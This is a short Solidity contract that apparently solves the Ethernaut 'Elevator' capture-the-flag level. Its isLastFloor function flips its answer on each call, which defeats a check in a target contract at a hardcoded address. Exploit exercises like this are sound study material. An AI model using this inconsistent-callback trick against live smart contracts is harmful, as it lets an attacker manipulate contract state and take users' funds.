// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool public lastFloor = false;
    IElevator hackContract =
        IElevator(0xE9eB72325AcAFb2b3DA6d2fc038E56934b68b9c0);

    function isLastFloor(uint256 _x) external returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }

    function goTo(uint256 _x) external {
        hackContract.goTo(_x);
    }
}
